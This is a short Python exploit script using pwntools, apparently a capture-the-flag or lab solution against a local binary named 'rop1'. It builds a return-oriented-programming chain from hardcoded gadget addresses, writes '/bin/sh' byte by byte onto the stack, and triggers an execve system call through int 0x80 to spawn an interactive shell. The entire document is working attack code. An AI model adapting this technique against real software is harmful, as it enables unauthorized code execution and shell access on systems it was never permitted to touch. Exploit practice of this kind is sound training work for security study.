from pwn import *

p = process('./rop1')
int80_addr = p32(0x08048108)
gadget1_addr = p32(0x080480d8)
gadget2_addr = p32(0x080480db)
stack_addr = p32(0xff85ca58)
binsh_addr = p32(0xff85ca55)

payload = 0
for index, ascnum in enumerate([47, 98, 105, 110, 47, 115, 104]):
    print(index, ascnum)
    if payload == 0:
        payload = gadget2_addr + p32(0xff85ca58 + index) + p32(1) * 6 + p32(ascnum) + gadget1_addr
    else:
        payload += gadget2_addr + p32(0xff85ca58 + index) + p32(1) * 6 + p32(ascnum) + gadget1_addr

# gdb.attach(p)

payload += gadget2_addr + p32(0) * 4 + stack_addr + p32(0) * 2 + p32(11) + int80_addr
                # EDI ESI EBP + esp 4 inc   EBX       ECX EDX      EAX

p.send(payload)

p.interactive()

